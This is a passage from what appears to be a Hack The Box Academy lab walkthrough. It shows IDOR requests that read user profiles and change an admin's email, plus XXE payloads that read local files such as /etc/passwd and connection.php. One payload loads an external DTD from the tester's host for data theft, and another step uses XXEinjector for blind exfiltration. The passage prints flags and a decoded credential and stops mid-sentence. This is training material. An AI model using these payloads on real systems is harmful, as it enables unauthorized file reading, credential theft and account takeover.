<span class="normal"><a href="#__codelineno-427-6">6</a></span>
<span class="normal"><a href="#__codelineno-427-7">7</a></span>
<span class="normal"><a href="#__codelineno-427-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-427-1"><a id="__codelineno-427-1" name="__codelineno-427-1"></a>GET //download.php?contract=(&#39;&amp;1&amp;&#39;) HTTP/1.1
</span><span id="__span-427-2"><a id="__codelineno-427-2" name="__codelineno-427-2"></a>Host: 94.237.54.116:37509
</span><span id="__span-427-3"><a id="__codelineno-427-3" name="__codelineno-427-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
</span><span id="__span-427-4"><a id="__codelineno-427-4" name="__codelineno-427-4"></a>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
</span><span id="__span-427-5"><a id="__codelineno-427-5" name="__codelineno-427-5"></a>Accept-Language: en-US,en;q=0.5
</span><span id="__span-427-6"><a id="__codelineno-427-6" name="__codelineno-427-6"></a>Accept-Encoding: gzip, deflate, br
</span><span id="__span-427-7"><a id="__codelineno-427-7" name="__codelineno-427-7"></a>Connection: keep-alive
</span><span id="__span-427-8"><a id="__codelineno-427-8" name="__codelineno-427-8"></a>Upgrade-Insecure-Requests: 1
</span></code></pre></div></td></tr></table></div>
<p>And adding the following payload processing:</p>
<p><img alt="" src="../img/idor01.png" /></p>
<p>Results: HTB{h45h1n6_1d5_w0n7_570p_m3}</p>
<p><strong>Try to read the details of the user with 'uid=5'. What is their 'uuid' value?</strong></p>
<p>We capture our request for reading our profile and change uid to 5 </p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-428-1">1</a></span>
<span class="normal"><a href="#__codelineno-428-2">2</a></span>
<span class="normal"><a href="#__codelineno-428-3">3</a></span>
<span class="normal"><a href="#__codelineno-428-4">4</a></span>
<span class="normal"><a href="#__codelineno-428-5">5</a></span>
<span class="normal"><a href="#__codelineno-428-6">6</a></span>
<span class="normal"><a href="#__codelineno-428-7">7</a></span>
<span class="normal"><a href="#__codelineno-428-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-428-1"><a id="__codelineno-428-1" name="__codelineno-428-1"></a>GET /profile/api.php/profile/5 HTTP/1.1
</span><span id="__span-428-2"><a id="__codelineno-428-2" name="__codelineno-428-2"></a>Host: 94.237.54.116:37509
</span><span id="__span-428-3"><a id="__codelineno-428-3" name="__codelineno-428-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
</span><span id="__span-428-4"><a id="__codelineno-428-4" name="__codelineno-428-4"></a>Accept: */*
</span><span id="__span-428-5"><a id="__codelineno-428-5" name="__codelineno-428-5"></a>Accept-Language: en-US,en;q=0.5
</span><span id="__span-428-6"><a id="__codelineno-428-6" name="__codelineno-428-6"></a>Accept-Encoding: gzip, deflate, br
</span><span id="__span-428-7"><a id="__codelineno-428-7" name="__codelineno-428-7"></a>Referer: http://94.237.54.116:37509/profile/index.php
</span><span id="__span-428-8"><a id="__codelineno-428-8" name="__codelineno-428-8"></a>Connection: keep-alive
</span></code></pre></div></td></tr></table></div>
<p>Results: eb4fe264c10eb7a528b047aa983a4829</p>
<p><strong>Try to change the admin's email to 'flag@idor.htb', and you should get the flag on the 'edit profile' page.</strong></p>
<p>We enumerate users until we find admin one. In my case it was 10. Then we send the following PUT request changing the email:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-429-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-429-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-429-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-429-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-429-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-429-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-429-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-429-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-429-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-429-10">10</a></span>
<span class="normal"><a href="#__codelineno-429-11">11</a></span>
<span class="normal"><a href="#__codelineno-429-12">12</a></span>
<span class="normal"><a href="#__codelineno-429-13">13</a></span>
<span class="normal"><a href="#__codelineno-429-14">14</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-429-1"><a id="__codelineno-429-1" name="__codelineno-429-1"></a>PUT /profile/api.php/profile/10 HTTP/1.1
</span><span id="__span-429-2"><a id="__codelineno-429-2" name="__codelineno-429-2"></a>Host: 94.237.50.242:58057
</span><span id="__span-429-3"><a id="__codelineno-429-3" name="__codelineno-429-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
</span><span id="__span-429-4"><a id="__codelineno-429-4" name="__codelineno-429-4"></a>Accept: */*
</span><span id="__span-429-5"><a id="__codelineno-429-5" name="__codelineno-429-5"></a>Accept-Language: en-US,en;q=0.5
</span><span id="__span-429-6"><a id="__codelineno-429-6" name="__codelineno-429-6"></a>Accept-Encoding: gzip, deflate, br
</span><span id="__span-429-7"><a id="__codelineno-429-7" name="__codelineno-429-7"></a>Referer: http://94.237.50.242:58057/profile/index.php
</span><span id="__span-429-8"><a id="__codelineno-429-8" name="__codelineno-429-8"></a>Content-type: application/json
</span><span id="__span-429-9"><a id="__codelineno-429-9" name="__codelineno-429-9"></a>Content-Length: 179
</span><span id="__span-429-10"><a id="__codelineno-429-10" name="__codelineno-429-10"></a>Origin: http://94.237.50.242:58057
</span><span id="__span-429-11"><a id="__codelineno-429-11" name="__codelineno-429-11"></a>Connection: keep-alive
</span><span id="__span-429-12"><a id="__codelineno-429-12" name="__codelineno-429-12"></a>Cookie: role=staff_admin
</span><span id="__span-429-13"><a id="__codelineno-429-13" name="__codelineno-429-13"></a>
</span><span id="__span-429-14"><a id="__codelineno-429-14" name="__codelineno-429-14"></a>{&quot;uid&quot;:&quot;10&quot;,&quot;uuid&quot;:&quot;bfd92386a1b48076792e68b596846499&quot;,&quot;role&quot;:&quot;staff_admin&quot;,&quot;full_name&quot;:&quot;admin&quot;,&quot;email&quot;:&quot;flag@idor.htb&quot;,&quot;about&quot;:&quot;Never gonna give you up, Never gonna let you down&quot;}
</span></code></pre></div></td></tr></table></div>
<p>Then we enter in our edit profile section and see the flag.</p>
<p>Results: HTB{1_4m_4n_1d0r_m4573r}</p>
<p><strong>Try to read the content of the 'connection.php' file, and submit the value of the 'api_key' as the answer.</strong></p>
<p>First we check out that it is vulnerable to XXE.</p>
<p><img alt="" src="../img/xxe_21.png" /></p>
<p>This is the request: </p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-430-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-430-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-430-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-430-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-430-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-430-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-430-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-430-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-430-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-430-10">10</a></span>
<span class="normal"><a href="#__codelineno-430-11">11</a></span>
<span class="normal"><a href="#__codelineno-430-12">12</a></span>
<span class="normal"><a href="#__codelineno-430-13">13</a></span>
<span class="normal"><a href="#__codelineno-430-14">14</a></span>
<span class="normal"><a href="#__codelineno-430-15">15</a></span>
<span class="normal"><a href="#__codelineno-430-16">16</a></span>
<span class="normal"><a href="#__codelineno-430-17">17</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-430-1"><a id="__codelineno-430-1" name="__codelineno-430-1"></a>POST /submitDetails.php HTTP/1.1
</span><span id="__span-430-2"><a id="__codelineno-430-2" name="__codelineno-430-2"></a>Host: 10.129.13.187
</span><span id="__span-430-3"><a id="__codelineno-430-3" name="__codelineno-430-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
</span><span id="__span-430-4"><a id="__codelineno-430-4" name="__codelineno-430-4"></a>Accept: */*
</span><span id="__span-430-5"><a id="__codelineno-430-5" name="__codelineno-430-5"></a>Accept-Language: en-US,en;q=0.5
</span><span id="__span-430-6"><a id="__codelineno-430-6" name="__codelineno-430-6"></a>Accept-Encoding: gzip, deflate, br
</span><span id="__span-430-7"><a id="__codelineno-430-7" name="__codelineno-430-7"></a>Content-Type: text/plain;charset=UTF-8
</span><span id="__span-430-8"><a id="__codelineno-430-8" name="__codelineno-430-8"></a>Content-Length: 205
</span><span id="__span-430-9"><a id="__codelineno-430-9" name="__codelineno-430-9"></a>Origin: http://10.129.13.187
</span><span id="__span-430-10"><a id="__codelineno-430-10" name="__codelineno-430-10"></a>Connection: keep-alive
</span><span id="__span-430-11"><a id="__codelineno-430-11" name="__codelineno-430-11"></a>Referer: http://10.129.13.187/
</span><span id="__span-430-12"><a id="__codelineno-430-12" name="__codelineno-430-12"></a>
</span><span id="__span-430-13"><a id="__codelineno-430-13" name="__codelineno-430-13"></a>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
</span><span id="__span-430-14"><a id="__codelineno-430-14" name="__codelineno-430-14"></a>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:////etc/passwd&quot; &gt; ]&gt;
</span><span id="__span-430-15"><a id="__codelineno-430-15" name="__codelineno-430-15"></a>&lt;root&gt;
</span><span id="__span-430-16"><a id="__codelineno-430-16" name="__codelineno-430-16"></a>&lt;name&gt;
</span><span id="__span-430-17"><a id="__codelineno-430-17" name="__codelineno-430-17"></a>[SNIP]
</span></code></pre></div></td></tr></table></div>
<p>Now we retrieve the file: </p>
<p><img alt="" src="../img/xxe_22.png" /></p>
<p>The request:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-431-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-431-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-431-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-431-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-431-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-431-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-431-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-431-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-431-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-431-10">10</a></span>
<span class="normal"><a href="#__codelineno-431-11">11</a></span>
<span class="normal"><a href="#__codelineno-431-12">12</a></span>
<span class="normal"><a href="#__codelineno-431-13">13</a></span>
<span class="normal"><a href="#__codelineno-431-14">14</a></span>
<span class="normal"><a href="#__codelineno-431-15">15</a></span>
<span class="normal"><a href="#__codelineno-431-16">16</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-431-1"><a id="__codelineno-431-1" name="__codelineno-431-1"></a>POST /submitDetails.php HTTP/1.1
</span><span id="__span-431-2"><a id="__codelineno-431-2" name="__codelineno-431-2"></a>Host: 10.129.13.187
</span><span id="__span-431-3"><a id="__codelineno-431-3" name="__codelineno-431-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
</span><span id="__span-431-4"><a id="__codelineno-431-4" name="__codelineno-431-4"></a>Accept: */*
</span><span id="__span-431-5"><a id="__codelineno-431-5" name="__codelineno-431-5"></a>Accept-Language: en-US,en;q=0.5
</span><span id="__span-431-6"><a id="__codelineno-431-6" name="__codelineno-431-6"></a>Accept-Encoding: gzip, deflate, br
</span><span id="__span-431-7"><a id="__codelineno-431-7" name="__codelineno-431-7"></a>Content-Type: text/plain;charset=UTF-8
</span><span id="__span-431-8"><a id="__codelineno-431-8" name="__codelineno-431-8"></a>Content-Length: 266
</span><span id="__span-431-9"><a id="__codelineno-431-9" name="__codelineno-431-9"></a>Origin: http://10.129.13.187
</span><span id="__span-431-10"><a id="__codelineno-431-10" name="__codelineno-431-10"></a>Connection: keep-alive
</span><span id="__span-431-11"><a id="__codelineno-431-11" name="__codelineno-431-11"></a>Referer: http://10.129.13.187/
</span><span id="__span-431-12"><a id="__codelineno-431-12" name="__codelineno-431-12"></a>
</span><span id="__span-431-13"><a id="__codelineno-431-13" name="__codelineno-431-13"></a>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
</span><span id="__span-431-14"><a id="__codelineno-431-14" name="__codelineno-431-14"></a>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=file:////var/www/html/connection.php&quot; &gt; ]&gt;
</span><span id="__span-431-15"><a id="__codelineno-431-15" name="__codelineno-431-15"></a>&lt;root&gt;
</span><span id="__span-431-16"><a id="__codelineno-431-16" name="__codelineno-431-16"></a>&lt;name&gt;
</span></code></pre></div></td></tr></table></div>
<p>Finally, we decode it: </p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-432-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-432-1"><a id="__codelineno-432-1" name="__codelineno-432-1"></a>sudo echo &quot;PD9waHAKCiRhcGlfa2V5ID0gIlVUTTFOak0wTW1SekoyZG1jVEl6TkQwd01YSm5aWGRtYzJSbUNnIjsKCnRyeSB7CgkkY29ubiA9IHBnX2Nvbm5lY3QoImhvc3Q9bG9jYWxob3N0IHBvcnQ9NTQzMiBkYm5hbWU9dXNlcnMgdXNlcj1wb3N0Z3JlcyBwYXNzd29yZD1pVWVyXnZkKGUxUGw5Iik7Cn0KCmNhdGNoICggZXhjZXB0aW9uICRlICkgewogCWVjaG8gJGUtPmdldE1lc3NhZ2UoKTsKfQoKPz4K&quot; | base64 -d
</span></code></pre></div></td></tr></table></div>
<p>Results: UTM1NjM0MmRzJ2dmcTIzND0wMXJnZXdmc2RmCg</p>
<p><strong>Use either method from this section to read the flag at '/flag.php'. (You may use the CDATA method at '/index.php', or the error-based method at '/error').</strong>
To bypass the previous limitation, we can utilize <code>XML Parameter Entities</code>, a special type of entity that starts with a <code>%</code> character and can only be used within the DTD: What's unique about parameter entities is that if we reference them from an external source.</p>
<div class="language-xml highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-433-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-433-1"><a id="__codelineno-433-1" name="__codelineno-433-1"></a><span class="cp">&lt;!ENTITY joined &quot;%begin;%file;%end;&quot;&gt;</span>
</span></code></pre></div></td></tr></table></div>
<p>So the final attack would be:</p>
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-434-1">1</a></span>
<span class="normal"><a href="#__codelineno-434-2">2</a></span>
<span class="normal"><a href="#__codelineno-434-3">3</a></span>
<span class="normal"><a href="#__codelineno-434-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-434-1"><a id="__codelineno-434-1" name="__codelineno-434-1"></a><span class="c1"># From our kali</span>
</span><span id="__span-434-2"><a id="__codelineno-434-2" name="__codelineno-434-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;&lt;!ENTITY joined &quot;%begin;%file;%end;&quot;&gt;&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>xxe.dtd
</span><span id="__span-434-3"><a id="__codelineno-434-3" name="__codelineno-434-3"></a>
</span><span id="__span-434-4"><a id="__codelineno-434-4" name="__codelineno-434-4"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">8000</span>
</span></code></pre></div></td></tr></table></div>
<p>In the attacking payload that is uploaded to the target server:</p>
<div class="language-xml highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-435-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-435-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-435-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-435-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-435-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-435-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-435-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-435-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-435-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-435-10">10</a></span>
<span class="normal"><a href="#__codelineno-435-11">11</a></span>
<span class="normal"><a href="#__codelineno-435-12">12</a></span>
<span class="normal"><a href="#__codelineno-435-13">13</a></span>
<span class="normal"><a href="#__codelineno-435-14">14</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-435-1"><a id="__codelineno-435-1" name="__codelineno-435-1"></a><span class="cp">&lt;!DOCTYPE email [</span>
</span><span id="__span-435-2"><a id="__codelineno-435-2" name="__codelineno-435-2"></a><span class="cp">  &lt;!ENTITY % begin &quot;&lt;![CDATA[&quot;&gt;</span><span class="w"> </span><span class="cm">&lt;!-- prepend the beginning of the CDATA tag --&gt;</span>
</span><span id="__span-435-3"><a id="__codelineno-435-3" name="__codelineno-435-3"></a><span class="w">  </span><span class="cp">&lt;!ENTITY % file SYSTEM &quot;file:///flag.php&quot;&gt;</span><span class="w"> </span><span class="cm">&lt;!-- reference external file --&gt;</span>
</span><span id="__span-435-4"><a id="__codelineno-435-4" name="__codelineno-435-4"></a><span class="w">  </span><span class="cp">&lt;!ENTITY % end &quot;]]&gt;</span>&quot;&gt;<span class="w"> </span><span class="cm">&lt;!-- append the end of the CDATA tag --&gt;</span>
</span><span id="__span-435-5"><a id="__codelineno-435-5" name="__codelineno-435-5"></a><span class="w">  </span><span class="cp">&lt;!ENTITY % xxe SYSTEM &quot;http://10.10.14.207:8000/xxe.dtd&quot;&gt;</span><span class="w"> </span><span class="cm">&lt;!-- reference our external DTD --&gt;</span>
</span><span id="__span-435-6"><a id="__codelineno-435-6" name="__codelineno-435-6"></a><span class="w">  </span>%xxe;
</span><span id="__span-435-7"><a id="__codelineno-435-7" name="__codelineno-435-7"></a>]&gt;
</span><span id="__span-435-8"><a id="__codelineno-435-8" name="__codelineno-435-8"></a>
</span><span id="__span-435-9"><a id="__codelineno-435-9" name="__codelineno-435-9"></a><span class="nt">&lt;root&gt;</span>
</span><span id="__span-435-10"><a id="__codelineno-435-10" name="__codelineno-435-10"></a><span class="nt">&lt;name&gt;&lt;/name&gt;</span>
</span><span id="__span-435-11"><a id="__codelineno-435-11" name="__codelineno-435-11"></a><span class="nt">&lt;tel&gt;&lt;/tel&gt;</span>
</span><span id="__span-435-12"><a id="__codelineno-435-12" name="__codelineno-435-12"></a><span class="nt">&lt;email&gt;</span><span class="ni">&amp;joined;</span><span class="nt">&lt;/email&gt;</span><span class="cm">&lt;!-- reference the &amp;joined; entity to print the file content --&gt;</span>
</span><span id="__span-435-13"><a id="__codelineno-435-13" name="__codelineno-435-13"></a><span class="nt">&lt;message&gt;&lt;/message&gt;</span>
</span><span id="__span-435-14"><a id="__codelineno-435-14" name="__codelineno-435-14"></a><span class="nt">&lt;/root&gt;</span>
</span></code></pre></div></td></tr></table></div>
<p><strong>Note:</strong> In some modern web servers, we may not be able to read some files (like index.php), as the web server would be preventing a DOS attack caused by file/entity self-reference (i.e., XML entity reference loop).</p>
<p><img alt="" src="../img/xxe_25.png" /></p>
<p>Results:  HTB{3rr0r5_c4n_l34k_d474}</p>
<p><strong>Using Blind Data Exfiltration on the '/blind' page to read the content of '/327a6c4304ad5938eaf0efb6cc3e53dc.php' and get the flag.</strong></p>
<p>We will use the tool XXEInjector:</p>
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-436-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-436-1"><a id="__codelineno-436-1" name="__codelineno-436-1"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/enjoiz/XXEinjector.git
</span></code></pre></div></td></tr></table></div>
<p>Once cloned, we will save our potentially vulnerable request into a file <code>xxe.req</code>. We will place the word <code>XXEINJECT</code> as a position locator for the tool:</p>
<div class="language-http highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-437-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-437-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-437-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-437-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-437-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-437-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-437-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-437-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-437-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-437-10">10</a></span>
<span class="normal"><a href="#__codelineno-437-11">11</a></span>
<span class="normal"><a href="#__codelineno-437-12">12</a></span>
<span class="normal"><a href="#__codelineno-437-13">13</a></span>
<span class="normal"><a href="#__codelineno-437-14">14</a></span>
<span class="normal"><a href="#__codelineno-437-15">15</a></span>
<span class="normal"><a href="#__codelineno-437-16">16</a></span>
<span class="normal"><a href="#__codelineno-437-17">17</a></span>
<span class="normal"><a href="#__codelineno-437-18">18</a></span>
<span class="normal"><a href="#__codelineno-437-19">19</a></span>
<span class="normal"><a href="#__codelineno-437-20">20</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-437-1"><a id="__codelineno-437-1" name="__codelineno-437-1"></a><span class="nf">POST</span> <span class="nn">/blind/submitDetails.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span><span id="__span-437-2"><a id="__codelineno-437-2" name="__codelineno-437-2"></a><span class="na">Host</span><span class="o">:</span> <span class="l">10.129.210.196</span>
</span><span id="__span-437-3"><a id="__codelineno-437-3" name="__codelineno-437-3"></a><span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span>
</span><span id="__span-437-4"><a id="__codelineno-437-4" name="__codelineno-437-4"></a><span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
</span><span id="__span-437-5"><a id="__codelineno-437-5" name="__codelineno-437-5"></a><span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
</span><span id="__span-437-6"><a id="__codelineno-437-6" name="__codelineno-437-6"></a><span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate, br</span>
</span><span id="__span-437-7"><a id="__codelineno-437-7" name="__codelineno-437-7"></a><span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/plain;charset=UTF-8</span>
</span><span id="__span-437-8"><a id="__codelineno-437-8" name="__codelineno-437-8"></a><span class="na">Content-Length</span><span class="o">:</span> <span class="l">167</span>
</span><span id="__span-437-9"><a id="__codelineno-437-9" name="__codelineno-437-9"></a><span class="na">Origin</span><span class="o">:</span> <span class="l">http://10.129.210.196</span>
</span><span id="__span-437-10"><a id="__codelineno-437-10" name="__codelineno-437-10"></a><span class="na">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
</span><span id="__span-437-11"><a id="__codelineno-437-11" name="__codelineno-437-11"></a><span class="na">Referer</span><span class="o">:</span> <span class="l">http://10.129.210.196/blind/</span>
</span><span id="__span-437-12"><a id="__codelineno-437-12" name="__codelineno-437-12"></a>
</span><span id="__span-437-13"><a id="__codelineno-437-13" name="__codelineno-437-13"></a>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
</span><span id="__span-437-14"><a id="__codelineno-437-14" name="__codelineno-437-14"></a>XXEINJECT
</span><span id="__span-437-15"><a id="__codelineno-437-15" name="__codelineno-437-15"></a>&lt;root&gt;
</span><span id="__span-437-16"><a id="__codelineno-437-16" name="__codelineno-437-16"></a>&lt;name&gt;lala&lt;/name&gt;
</span><span id="__span-437-17"><a id="__codelineno-437-17" name="__codelineno-437-17"></a>&lt;tel&gt;11237865432&lt;/tel&gt;
</span><span id="__span-437-18"><a id="__codelineno-437-18" name="__codelineno-437-18"></a>&lt;email&gt;lala@lalal.com&lt;/email&gt;
</span><span id="__span-437-19"><a id="__codelineno-437-19" name="__codelineno-437-19"></a>&lt;message&gt;sksaka&lt;/message&gt;
</span><span id="__span-437-20"><a id="__codelineno-437-20" name="__codelineno-437-20"></a>&lt;/root&gt;
</span></code></pre></div></td></tr></table></div>
<p>Now we can run the tool:</p>
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-438-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-438-1"><a id="__codelineno-438-1" name="__codelineno-438-1"></a>ruby<span class="w"> </span>XXEinjector.rb<span class="w"> </span>--host<span class="o">=</span><span class="m">10</span>.10.14.207<span class="w"> </span>--httpport<span class="o">=</span><span class="m">8000</span><span class="w"> </span>--file<span class="o">=</span>xxe.req<span class="w"> </span>--path<span class="o">=</span>/327a6c4304ad5938eaf0efb6cc3e53dc.php<span class="w"> </span>--oob<span class="o">=</span>http<span class="w"> </span>--phpfilter
</span></code></pre></div></td></tr></table></div>
<p>And see the logs under the new created Log folder within the tool:</p>
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-439-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-439-1"><a id="__codelineno-439-1" name="__codelineno-439-1"></a>cat<span class="w"> </span>Logs/10.129.210.196/327a6c4304ad5938eaf0efb6cc3e53dc.php.log<span class="w"> </span>
</span></code></pre></div></td></tr></table></div>
<p>Results: </p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-440-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-440-1"><a id="__codelineno-440-1" name="__codelineno-440-1"></a>&lt;?php $flag = &quot;HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}&quot;; ?&gt;
</span></code></pre></div></td></tr></table></div>
<p>Results: HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}</p>
<h3 id="skills-assessment_8">Skills Assessment</h3>
<p>Try to escalate your privileges and exploit different vulnerabilities to read the flag at '/flag.php'.</p>
<p>We can enumerate user with the GET request:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-441-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-441-1"><a id="__codelineno-441-1" name="__codelineno-441-1"></a>GET /api.php/user/74 HTTP/1.1
</span></code></pre></div></td></tr></table></div>
<p>After launching an Intruder attack we retrieve users from uid 1 to uid 100. We filter them out and get the user Administrator:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-442-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-442-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-442-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-442-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-442-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-442-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-442-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-442-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-442-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-442-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-442-1"><a id="__codelineno-442-1" name="__codelineno-442-1"></a>HTTP/1.1 200 OK
</span><span id="__span-442-2"><a id="__codelineno-442-2" name="__codelineno-442-2"></a>Date: Sun, 12 Jan 2025 21:42:51 GMT
</span><span id="__span-442-3"><a id="__codelineno-442-3" name="__codelineno-442-3"></a>Server: Apache/2.4.41 (Ubuntu)
</span><span id="__span-442-4"><a id="__codelineno-442-4" name="__codelineno-442-4"></a>Vary: Accept-Encoding
</span><span id="__span-442-5"><a id="__codelineno-442-5" name="__codelineno-442-5"></a>Content-Length: 90
</span><span id="__span-442-6"><a id="__codelineno-442-6" name="__codelineno-442-6"></a>Keep-Alive: timeout=5, max=93
</span><span id="__span-442-7"><a id="__codelineno-442-7" name="__codelineno-442-7"></a>Connection: Keep-Alive
</span><span id="__span-442-8"><a id="__codelineno-442-8" name="__codelineno-442-8"></a>Content-Type: text/html; charset=UTF-8
</span><span id="__span-442-9"><a id="__codelineno-442-9" name="__codelineno-442-9"></a>
</span><span id="__span-442-10"><a id="__codelineno-442-10" name="__codelineno-442-10"></a>{&quot;uid&quot;:&quot;52&quot;,&quot;username&quot;:&quot;a.corrales&quot;,&quot;full_name&quot;:&quot;Amor Corrales&quot;,&quot;company&quot;:&quot;Administrator&quot;}
</span></code></pre></div></td></tr></table></div>
<p>We observe that we can change our password. But also, by retrieving the token for any other user with:</p>
